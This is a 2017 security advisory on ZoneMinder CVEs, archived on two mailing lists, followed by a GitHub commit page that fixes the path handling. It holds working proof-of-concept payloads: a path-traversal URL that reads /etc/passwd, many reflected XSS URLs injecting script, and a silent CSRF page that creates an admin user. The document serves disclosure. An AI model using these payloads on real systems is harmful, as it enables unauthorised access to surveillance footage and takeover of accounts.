=== Content from seclists.org_d8376087_20250124_205827.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](12)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](12)

![](/shared/images/nst-icons.svg#search)

# ZoneMinder - multiple vulnerabilities

---

*From*: John Marzella <john () terabyteit com au>

*Date*: Sun, 5 Feb 2017 11:22:18 +1100

---

```

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

==========================================================================
Product: ZoneMinder
Versions: Multiple versions - see inline
Vulnerabilities: File disclosure, XSS, CSRF, Auth bypass & Info disclosure
CVE-IDs: CVE-2017-5595, CVE-2017-5367, CVE-2017-5368, CVE-2016-10140
Author: John Marzella
Date: 03/02/2017
==========================================================================

CVE-2016-10140 - Auth bypass and Info disclosure - affects v1.30 and v1.29
==========================================================================
Contacted vendor on 08/11/2016

```
Apache HTTP Server configuration bundled with ZoneMinder allows a remote
unauthenticated attacker to browse all directories
in the web root, e.g., a remote unauthenticated attacker can view all
CCTV images on the server.
```

PoC: http://<serverIP>/events

```
Fix:
<https://github.com/ZoneMinder/ZoneMinder/commit/71898df7565ed2a51dfe76a1cf30ddb81fc888ba>
```

CVE-2017-5595 - File disclosure - affects v1.xx - code from 2008
================================================================
Contacted vendor on 22/01/2017

```
File disclosure and inclusion vulnerability exists in ZoneMinder v1.30.0
due to unfiltered user-input being passed to readfile() in
views/file.php which allows an authenticated attacker to read local
system files (e.g. /etc/passwd) in the context of the web server user
(www-data).
```

```
PoC:
http://<serverIP>/zm/index.php?view=file&path=/../../../../../etc/passwd
```

```
Fix:
<https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3>
```

CVE-2017-5367 - XSS - affects v1.30 and v1.29
=============================================
Contacted vendor on 20/11/2016

Multiple reflected XSS exists.

```
The following has been injected into vulnerable URLâ€™s to show that the
users session cookie can be stolen.
```

%3Cscript%3Ealert(document.cookie);%3C/script%3E

In form input view using POST at http://<serverIP>/zm/

```
PoC:
http://<serverIP>/zm/index.php?action=login&view=postlogin%3Cscript%3Ealert(document.cookie);%3C/script%3E&postLoginQuery=1&username=testuser&password=testpassword
```

In link input view using GET at http://<serverIP>/zm/

```
PoC:
http://<serverIP>/zm/?view=groups%3Cscript%3Ealert(document.cookie);%3C/script%3E
```

In link input filter[terms][1][cnj] using GET at http://<serverIP>/zm/

```
PoC:
http://<serverIP>/zm/?view=events&page=1&filter[terms][0][attr]=DateTime&filter[terms][0][op]=%3E%3D&filter[terms][0][val]=-1%2Bhour&filter[terms][1][cnj]=and%3Cscript%3Ealert(document.cookie);%3C/script%3E&filter[terms][1][attr]=MonitorId&filter[terms][1][op]=%3D&filter[terms][1][val]=1
```

In form input view using GET at http://<serverIP>/zm/index.php

```
PoC:
http://<serverIP>/zm/index.php?view=console%3Cscript%3Ealert(document.cookie);%3C/script%3E&action=1&addBtn=Add%20New%20Monitor&editBtn=Edit&deleteBtn=Delete&markMids[]=2
```

```
In form input filter[terms][1][cnj] using POST at
http://<serverIP>/zm/index.php
PoC:
http://<serverIP>/zm/index.php?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=Archived&filter%5Bterms%5D%5B0%5D%5Bop%5D=%3D&filter%5Bterms%5D%5B0%5D%5Bval%5D=1&filter%5Bterms%5D%5B1%5D%5Bcnj%5D=and%3Cscript%3Ealert(document.cookie);%3C/script%3E&filter%5Bterms%5D%5B1%5D%5Battr%5D=MonitorId&filter%5Bterms%5D%5B1%5D%5Bop%5D=%3D&filter%5Bterms%5D%5B1%5D%5Bval%5D=1
```

In form input filter[terms][1][cnj] using POST at http://<serverIP>/zm/

```
PoC:
http://<serverIP>/zm/?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=DateTime&filter%5Bterms%5D%5B0%5D%5Bop%5D=&filter%5Bterms%5D%5B0%5D%5Bval%5D=-1+hour&filter%5Bterms%5D%5B1%5D%5Bcnj%5D=%3Cscript%3Ealert(document.cookie);%3C/script%3Eand&filter%5Bterms%5D%5B1%5D%5Battr%5D=MonitorId&filter%5Bterms%5D%5B1%5D%5Bop%5D==&filter%5Bterms%5D%5B1%5D%5Bval%5D=1
```

In form input limit using POST at http://<serverIP>/zm/index.php

```
PoC:
http://<serverIP>/zm/index.php?view=events&action=1&page=1&filter[terms][0][attr]=DateTime&filter[terms][0][op]=%3E%3D&filter[terms][0][val]=-1%2Bmonth&sort\_field=StartTime&sort\_asc=1&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
```

In link input limit using GET at http://<serverIP>/zm/index.php

```
PoC:
http://<serverIP>/zm/index.php?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=DateTime&filter%5Bterms%5D%5B0%5D%5Bop%5D=%3E%3D&filter%5Bterms%5D%5B0%5D%5Bval%5D=-1%2Bmonth&sort\_field=Id&sort\_asc=0&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
```

In form input limit using POST at http://<serverIP>/zm/

```
PoC:
http://<serverIP>/zm/?view=events&action=1&page=1&sort\_field=StartTime&sort\_asc=1&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
```

In link input limit using GET at http://<serverIP>/zm/

```
PoC:
http://<serverIP>/zm/?view=events&page=1&sort\_field=Id&sort\_asc=0&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
```

CVE-2017-5368 - CSRF - affects v1.30 and v1.29
==============================================
Contacted vendor on 20/11/2016

No CSRF protection exists across entire web app.

```
PoC: The following html page silently adds a new admin user to
Zoneminder if the admin user is already logged in.
```

csrf_poc_addUser.html

<!-- Example of silent CSRF using iframe -->
<iframe style="display:none" name="csrf-frame"></iframe>

```
<form method='POST' action="http://<serverIP>/zm/index.php"
target="csrf-frame" id="csrf-form">
```

  <input type="hidden" name="view" value="user"/>
  <input type="hidden" name="action" value="user"/>
  <input type="hidden" name="uid" value="0"/>
  <input type="hidden" name="newUser[MonitorIds]" value=""/>
  <input type="hidden" name="newUser[Username]" value="attacker1"/>
  <input type="hidden" name="newUser[Password]" value="Password1234"/>
  <input type="hidden" name="conf_password" value="Password1234"/>
  <input type="hidden" name="newUser[Language]" value="en_gb"/>
  <input type="hidden" name="newUser[Enabled]" value="1"/>
  <input type="hidden" name="newUser[Stream]" value="View"/>
  <input type="hidden" name="newUser[Events]" value="Edit"/>
  <input type="hidden" name="newUser[Control]" value="Edit"/>
  <input type="hidden" name="newUser[Monitors]" value="Edit"/>
  <input type="hidden" name="newUser[Groups]" value="Edit"/>
  <input type="hidden" name="newUser[System]" value="Edit"/>
  <input type="hidden" name="newUser[MaxBandwidth]" value="high"/>
</form>
<script>document.getElementById("csrf-form").submit()</script>

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJYlm6PAAoJEA6vWorZiWpjfdgP/25I6nicsAHEF2mFw070Y76O
wUx9Epy5e4YJthdPn0zt/Vp/jg6MyT4I9sYBeqoZo64WNfO0mefiIBi/g3bMr9pt
rmDwAx3QWi+HYO8qAF5bJ7uaGbC7+nVXoSeKCeAQDADVCt6lSTejkZo9YcJsHO6S
nhDQ3NWCOy6LAQvPRBetomTQWlQzUJlVuk515ynrMhzJiRpglPajJc+ef8QVkPp8
//JOSELjYjVXDNQagW1C54aMXAmFk5qQIJHnXWjGT+pR4f42ldCWzNaNERTFXKkd
WlViLULT6GaIJ9jbHE8A1LxfwHkGo304eas3mi8Hk3bItBZ+Ly551ombM6Sa5pnu
SG4n6RsxXkxWWf5Nb4BcapNYMrdCOnPShm6DOKQB3yw/5+XSVgIJp4ZEXcM9Nseb
0OMLVg5jWSuZZZMvm+5KDjaZEzyCF8bHtQpTozx8RqbV49wz0So+DROjauP2CFI1
FkYc/4FoZYdpH+RFjwPV3sqYSXKpV4zdR2KzmnKGIj5fqrTIZL5V3/kA5LoaqBzu
hb5qun5kJLGx+2/7CEUaulDL43mnGZqrF2M1UT6MVkWbLaqhMNuMXXpJ72MhFhA+
EtxvUuVl4KaORlGx+ycAhc5AJ7/Y6T7estEVcjo3RUTORF82MxXcoZk1Y6J7ue2m
VX0oYa15mgdhrbjdE8tX
=TE/v
-----END PGP SIGNATURE-----

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](12)

[![Previous](/images/left-icon-16x16.png)](10)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](12)

### Current thread:

* **ZoneMinder - multiple vulnerabilities** *John Marzella (Feb 04)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_654ab60c_20250124_205826.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# ZoneMinder - multiple vulnerabilities

---

*From*: john () terabyteit com au

*Date*: Sun, 5 Feb 2017 00:32:52 GMT

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

==========================================================================
Product: ZoneMinder
Versions: Multiple versions - see inline
Vulnerabilities: File disclosure, XSS, CSRF, Auth bypass & Info disclosure
CVE-IDs: CVE-2017-5595, CVE-2017-5367, CVE-2017-5368, CVE-2016-10140
Author: John Marzella
Date: 03/02/2017
==========================================================================

CVE-2016-10140 - Auth bypass and Info disclosure - affects v1.30 and v1.29
==========================================================================
Contacted vendor on 08/11/2016

Apache HTTP Server configuration bundled with ZoneMinder allows a remote unauthenticated attacker to browse all
directories
in the web root, e.g., a remote unauthenticated attacker can view all CCTV images on the server.

PoC: http://<serverIP>/events

Fix: <https://github.com/ZoneMinder/ZoneMinder/commit/71898df7565ed2a51dfe76a1cf30ddb81fc888ba>

CVE-2017-5595 - File disclosure - affects v1.xx - code from 2008
================================================================
Contacted vendor on 22/01/2017

File disclosure and inclusion vulnerability exists in ZoneMinder v1.30.0 due to unfiltered user-input being passed to
readfile() in views/file.php which allows an authenticated attacker to read local system files (e.g. /etc/passwd) in
the context of the web server user (www-data).

PoC: http://<serverIP>/zm/index.php?view=file&path=/../../../../../etc/passwd

Fix: <https://github.com/ZoneMinder/ZoneMinder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3>

CVE-2017-5367 - XSS - affects v1.30 and v1.29
=============================================
Contacted vendor on 20/11/2016

Multiple reflected XSS exists.

The following has been injected into vulnerable URLÂ’s to show that the users session cookie can be stolen.
%3Cscript%3Ealert(document.cookie);%3C/script%3E

In form input view using POST at http://<serverIP>/zm/
PoC:
http://<serverIP>/zm/index.php?action=login&view=postlogin%3Cscript%3Ealert(document.cookie);%3C/script%3E&postLoginQuery=1&username=testuser&password=testpassword

In link input view using GET at http://<serverIP>/zm/
PoC: http://<serverIP>/zm/?view=groups%3Cscript%3Ealert(document.cookie);%3C/script%3E

In link input filter[terms][1][cnj] using GET at http://<serverIP>/zm/
PoC:
http://<serverIP>/zm/?view=events&page=1&filter[terms][0][attr]=DateTime&filter[terms][0][op]=%3E%3D&filter[terms][0][val]=-1%2Bhour&filter[terms][1][cnj]=and%3Cscript%3Ealert(document.cookie);%3C/script%3E&filter[terms][1][attr]=MonitorId&filter[terms][1][op]=%3D&filter[terms][1][val]=1

In form input view using GET at http://<serverIP>/zm/index.php
PoC:
http://<serverIP>/zm/index.php?view=console%3Cscript%3Ealert(document.cookie);%3C/script%3E&action=1&addBtn=Add%20New%20Monitor&editBtn=Edit&deleteBtn=Delete&markMids[]=2

In form input filter[terms][1][cnj] using POST at http://<serverIP>/zm/index.php
PoC:
http://<serverIP>/zm/index.php?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=Archived&filter%5Bterms%5D%5B0%5D%5Bop%5D=%3D&filter%5Bterms%5D%5B0%5D%5Bval%5D=1&filter%5Bterms%5D%5B1%5D%5Bcnj%5D=and%3Cscript%3Ealert(document.cookie);%3C/script%3E&filter%5Bterms%5D%5B1%5D%5Battr%5D=MonitorId&filter%5Bterms%5D%5B1%5D%5Bop%5D=%3D&filter%5Bterms%5D%5B1%5D%5Bval%5D=1

In form input filter[terms][1][cnj] using POST at http://<serverIP>/zm/
PoC:
http://<serverIP>/zm/?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=DateTime&filter%5Bterms%5D%5B0%5D%5Bop%5D=&filter%5Bterms%5D%5B0%5D%5Bval%5D=-1+hour&filter%5Bterms%5D%5B1%5D%5Bcnj%5D=%3Cscript%3Ealert(document.cookie);%3C/script%3Eand&filter%5Bterms%5D%5B1%5D%5Battr%5D=MonitorId&filter%5Bterms%5D%5B1%5D%5Bop%5D==&filter%5Bterms%5D%5B1%5D%5Bval%5D=1

In form input limit using POST at http://<serverIP>/zm/index.php
PoC:
http://<serverIP>/zm/index.php?view=events&action=1&page=1&filter[terms][0][attr]=DateTime&filter[terms][0][op]=%3E%3D&filter[terms][0][val]=-1%2Bmonth&sort_field=StartTime&sort_asc=1&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E

In link input limit using GET at http://<serverIP>/zm/index.php
PoC:
http://<serverIP>/zm/index.php?view=events&page=1&filter%5Bterms%5D%5B0%5D%5Battr%5D=DateTime&filter%5Bterms%5D%5B0%5D%5Bop%5D=%3E%3D&filter%5Bterms%5D%5B0%5D%5Bval%5D=-1%2Bmonth&sort_field=Id&sort_asc=0&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E

In form input limit using POST at http://<serverIP>/zm/
PoC:
http://<serverIP>/zm/?view=events&action=1&page=1&sort_field=StartTime&sort_asc=1&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E

In link input limit using GET at http://<serverIP>/zm/
PoC:
http://<serverIP>/zm/?view=events&page=1&sort_field=Id&sort_asc=0&limit=1%22%3E%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E

CVE-2017-5368 - CSRF - affects v1.30 and v1.29
==============================================
Contacted vendor on 20/11/2016

No CSRF protection exists across entire web app.

PoC: The following html page silently adds a new admin user to Zoneminder if the admin user is already logged in.

csrf_poc_addUser.html

<!-- Example of silent CSRF using iframe -->
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action="http://<serverIP>/zm/index.php" target="csrf-frame" id="csrf-form">
  <input type="hidden" name="view" value="user"/>
  <input type="hidden" name="action" value="user"/>
  <input type="hidden" name="uid" value="0"/>
  <input type="hidden" name="newUser[MonitorIds]" value=""/>
  <input type="hidden" name="newUser[Username]" value="attacker1"/>
  <input type="hidden" name="newUser[Password]" value="Password1234"/>
  <input type="hidden" name="conf_password" value="Password1234"/>
  <input type="hidden" name="newUser[Language]" value="en_gb"/>
  <input type="hidden" name="newUser[Enabled]" value="1"/>
  <input type="hidden" name="newUser[Stream]" value="View"/>
  <input type="hidden" name="newUser[Events]" value="Edit"/>
  <input type="hidden" name="newUser[Control]" value="Edit"/>
  <input type="hidden" name="newUser[Monitors]" value="Edit"/>
  <input type="hidden" name="newUser[Groups]" value="Edit"/>
  <input type="hidden" name="newUser[System]" value="Edit"/>
  <input type="hidden" name="newUser[MaxBandwidth]" value="high"/>
</form>
<script>document.getElementById("csrf-form").submit()</script>

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJYlm6PAAoJEA6vWorZiWpjfdgP/25I6nicsAHEF2mFw070Y76O
wUx9Epy5e4YJthdPn0zt/Vp/jg6MyT4I9sYBeqoZo64WNfO0mefiIBi/g3bMr9pt
rmDwAx3QWi+HYO8qAF5bJ7uaGbC7+nVXoSeKCeAQDADVCt6lSTejkZo9YcJsHO6S
nhDQ3NWCOy6LAQvPRBetomTQWlQzUJlVuk515ynrMhzJiRpglPajJc+ef8QVkPp8
//JOSELjYjVXDNQagW1C54aMXAmFk5qQIJHnXWjGT+pR4f42ldCWzNaNERTFXKkd
WlViLULT6GaIJ9jbHE8A1LxfwHkGo304eas3mi8Hk3bItBZ+Ly551ombM6Sa5pnu
SG4n6RsxXkxWWf5Nb4BcapNYMrdCOnPShm6DOKQB3yw/5+XSVgIJp4ZEXcM9Nseb
0OMLVg5jWSuZZZMvm+5KDjaZEzyCF8bHtQpTozx8RqbV49wz0So+DROjauP2CFI1
FkYc/4FoZYdpH+RFjwPV3sqYSXKpV4zdR2KzmnKGIj5fqrTIZL5V3/kA5LoaqBzu
hb5qun5kJLGx+2/7CEUaulDL43mnGZqrF2M1UT6MVkWbLaqhMNuMXXpJ72MhFhA+
EtxvUuVl4KaORlGx+ycAhc5AJ7/Y6T7estEVcjo3RUTORF82MxXcoZk1Y6J7ue2m
VX0oYa15mgdhrbjdE8tX
=TE/v
-----END PGP SIGNATURE-----

```

---

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **ZoneMinder - multiple vulnerabilities** *john (Feb 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from github.com_79474b92_20250126_032816.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZoneMinder%2FZoneMinder%2Fcommit%2F8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZoneMinder%2FZoneMinder%2Fcommit%2F8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=ZoneMinder%2Fzoneminder)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ZoneMinder](/ZoneMinder)
/
**[zoneminder](/ZoneMinder/zoneminder)**
Public

* [Notifications](/login?return_to=%2FZoneMinder%2Fzoneminder) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2FZoneMinder%2Fzoneminder)
* [Star
   5.3k](/login?return_to=%2FZoneMinder%2Fzoneminder)

* [Code](/ZoneMinder/zoneminder)
* [Issues
  156](/ZoneMinder/zoneminder/issues)
* [Pull requests
  12](/ZoneMinder/zoneminder/pulls)
* [Discussions](/ZoneMinder/zoneminder/discussions)
* [Actions](/ZoneMinder/zoneminder/actions)
* [Projects
  0](/ZoneMinder/zoneminder/projects)
* [Wiki](/ZoneMinder/zoneminder/wiki)
* [Security](/ZoneMinder/zoneminder/security)
* [Insights](/ZoneMinder/zoneminder/pulse)

Additional navigation options

* [Code](/ZoneMinder/zoneminder)
* [Issues](/ZoneMinder/zoneminder/issues)
* [Pull requests](/ZoneMinder/zoneminder/pulls)
* [Discussions](/ZoneMinder/zoneminder/discussions)
* [Actions](/ZoneMinder/zoneminder/actions)
* [Projects](/ZoneMinder/zoneminder/projects)
* [Wiki](/ZoneMinder/zoneminder/wiki)
* [Security](/ZoneMinder/zoneminder/security)
* [Insights](/ZoneMinder/zoneminder/pulse)

## Commit

[Permalink](/ZoneMinder/zoneminder/commit/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

sanitize the image path before processing

[Browse files](/ZoneMinder/zoneminder/tree/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3)
Browse the repository at this point in the history

* Loading branch information

[![@knight-of-ni](https://avatars.githubusercontent.com/u/5150042?s=40&v=4)](/knight-of-ni)

[knight-of-ni](/ZoneMinder/zoneminder/commits?author=knight-of-ni "View all commits by knight-of-ni")
committed
Jan 25, 2017

1 parent
[13dc11b](/ZoneMinder/zoneminder/commit/13dc11bdf519330671dd4b09ed4b04a50de8abbc)

commit 8b19fca

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**15 additions**
and
**72 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* web/views

  + web/views/file.php
    [file.php](#diff-fcc57edd157d39639cb20ad75582698417d36569fb79d67ff30b5ec88af68ed1)
  + web/views/image.php
    [image.php](#diff-499ab839d2f2c083fa143882c8ffb17bb9780ab8485a6547b151e181be13c89b)

## There are no files selected for viewing

56 changes: 0 additions & 56 deletions

56
[web/views/file.php](#diff-fcc57edd157d39639cb20ad75582698417d36569fb79d67ff30b5ec88af68ed1 "web/views/file.php")

Show comments

[View file](/ZoneMinder/zoneminder/blob/13dc11bdf519330671dd4b09ed4b04a50de8abbc/web/views/file.php)
Edit file

Delete file

Load diff

This file was deleted.

Oops, something went wrong.

Retry

31 changes: 15 additions & 16 deletions

31
[web/views/image.php](#diff-499ab839d2f2c083fa143882c8ffb17bb9780ab8485a6547b151e181be13c89b "web/views/image.php")

Show comments

[View file](/ZoneMinder/zoneminder/blob/8b19fca9927cdec07cc9dd09bdcf2496a5ae69b3/web/views/image.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -78,24 +78,23 @@ function imagescale($image, $new\_width, $new\_height = -1, $mode = 0) |
|  |  | } else { |
|  |  | $errorText = "No image path"; |
|  |  | } |
|  |  | } |
|  |  | else |
|  |  | { |
|  |  | $path = ZM\_DIR\_EVENTS . '/' . $\_REQUEST['path']; |
|  |  | if ( !empty($user['MonitorIds']) ) |
|  |  | { |
|  |  | $imageOk = false; |
|  |  | $pathMonId = substr( $path, 0, strspn( $path, "1234567890" ) ); |
|  |  | foreach ( preg\_split( '/["\'\s]\*,["\'\s]\*/', $user['MonitorIds'] ) as $monId ) |
|  |  | { |
|  |  | if ( $pathMonId == $monId ) |
|  |  | { |
|  |  | $imageOk = true; |
|  |  | break; |
|  |  | } else { |
|  |  | $path = realpath(ZM\_DIR\_EVENTS . '/' . $\_REQUEST['path']); |
